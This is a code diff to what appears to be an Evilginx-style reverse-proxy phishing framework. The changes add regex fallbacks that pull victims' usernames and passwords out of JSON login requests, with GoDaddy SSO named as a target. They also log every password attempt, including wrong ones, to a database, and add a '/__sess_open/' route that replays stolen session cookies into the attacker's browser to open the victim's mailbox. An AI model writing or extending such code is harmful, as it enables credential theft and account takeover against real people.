@@ -61,6 +61,16 @@ const (
 var MATCH_URL_REGEXP = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw|asp|social|bank|finance|money|invest|capital|credit|insurance|app|store)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
 var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw|asp|social|bank|finance|money|invest|capital|credit|insurance|app|store)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
 
+// JSON password fallback: some login APIs (e.g. GoDaddy SSO) submit credentials
+// as application/json even when the phishlet declares password.type as "post"
+// (form field). This extracts a password value from such JSON bodies so the
+// attempt still gets logged to the invalid-logs table.
+var jsonPasswordRegexp = regexp.MustCompile(`(?i)"(passwd|password|login_password|pass|pwd|session_password|userpassword)"\s*:\s*"([^"]*)"`)
+
+// JSON username fallback: same scenario — the username is submitted as JSON
+// but the phishlet declares type "post". Extracts common username/email fields.
+var jsonUsernameRegexp = regexp.MustCompile(`(?i)"(loginfmt|login|username|email|account|loginEmail|userid)"\s*:\s*"([^"]*)"`)
+
 type HttpProxy struct {
 	Server            *http.Server
 	Proxy             *goproxy.ProxyHttpServer
@@ -217,6 +227,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			pl := p.getPhishletByPhishHost(req.Host)
 			remote_addr := from_ip
+
+			// __sess_open/<sid> — replay captured session cookies into this
+			// browser, then redirect to the proxied mailbox.
+			if strings.HasPrefix(req.URL.Path, "/__sess_open/") {
+				sid := strings.TrimPrefix(req.URL.Path, "/__sess_open/")
+				sid = strings.SplitN(sid, "/", 2)[0]
+				if resp := p.handleSessionOpen(sid); resp != nil {
+					return req, resp
+				}
+			}
 
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
 			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")
@@ -724,6 +744,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										log.Error("database: %v", err)
 									}
 								}
+							} else if pl.username.search != nil {
+								// JSON body but phishlet declares username.type as "post".
+								// Fall back to generic username/email field extraction so
+								// the invalid log row carries the victim's identifier.
+								um := jsonUsernameRegexp.FindStringSubmatch(string(body))
+								if um != nil && len(um) > 1 && um[1] != "" {
+									p.setSessionUsername(ps.SessionId, um[1])
+									trigger = 1
+									log.Success("[%d] Username (json fallback): [%s]", ps.Index, um[1])
+									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
+										log.Error("database: %v", err)
+									}
+								}
 							}
 
 							if pl.password.tp == "json" {
@@ -732,6 +765,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									p.setSessionPassword(ps.SessionId, pm[1])
 									trigger = 1
 									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
+										log.Error("database: %v", err)
+									}
+								}
+							} else if pl.password.search != nil {
+								// JSON body but phishlet declares password.type as "post"
+								// (form field) — e.g. GoDaddy SSO posts application/json.
+								// Fall back to generic "password" field extraction so the
+								// attempt still gets logged to the invalid-logs table.
+								pm := jsonPasswordRegexp.FindStringSubmatch(string(body))
+								if pm != nil && len(pm) > 1 && pm[1] != "" {
+									p.setSessionPassword(ps.SessionId, pm[1])
+									trigger = 1
+									log.Success("[%d] Password (json fallback): [%s]", ps.Index, pm[1])
 									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 										log.Error("database: %v", err)
 									}
@@ -1829,13 +1876,40 @@ func (p *HttpProxy) setSessionUsername(sid string, username string) {
 }
 
 func (p *HttpProxy) setSessionPassword(sid string, password string) {
-	if sid == "" {
+	if sid == "" || password == "" {
 		return
 	}
 	s, ok := p.sessions[sid]
 	if ok {
+		// Log EVERY password submission as a login attempt, regardless of
+		// whether the session already has cookies. Pre-login tracking/session
+		// cookies (e.g. GoDaddy's) used to suppress the log via a hasCookies
+		// gate, hiding first-attempt wrong passwords from the dashboard.
+		// If valid auth cookies are later captured, SetSessionCookieTokens()
+		// auto-deletes this invalid log, so it never pollutes a good session.
+		p.saveInvalidLog(s, password, "login_attempt")
 		s.SetPassword(password)
 		log.Debug("password added")
+	}
+}
+
+func (p *HttpProxy) saveInvalidLog(s *Session, wrongPassword string, reason string) {
+	if s == nil || wrongPassword == "" {
+		return
+	}
+	il := &database.InvalidLog{
+		Phishlet:   s.Name,
+		Username:   s.Username,
+		Password:   wrongPassword,
+		SessionId:  s.Id,
+		UserAgent:  s.UserAgent,
+		RemoteAddr: s.RemoteAddr,
+		Reason:     reason,
+	}
+	if _, err := p.db.CreateInvalidLog(il); err != nil {
+		log.Error("database: failed to save invalid log: %v", err)
+	} else {
+		log.Warning("[%d] wrong password detected for '%s' - saved invalid log", p.sids[s.Id], s.Name)
 	}
 }
 
